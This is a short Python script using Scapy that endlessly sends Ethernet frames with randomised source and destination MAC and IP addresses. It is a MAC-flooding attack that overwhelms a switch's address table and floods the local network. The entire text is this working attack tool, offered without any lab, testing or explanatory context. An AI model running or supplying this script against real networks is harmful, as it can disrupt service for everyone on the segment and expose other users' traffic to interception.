from scapy.all import *
sendp(Ether(src=RandMAC("*:*:*:*:*:*"),dst=RandMAC("*:*:*:*:*:*"))/IP(src=RandIP("*.*.*.*"),dst=RandIP("*.*.*.*"))/ICMP(), loop=1)
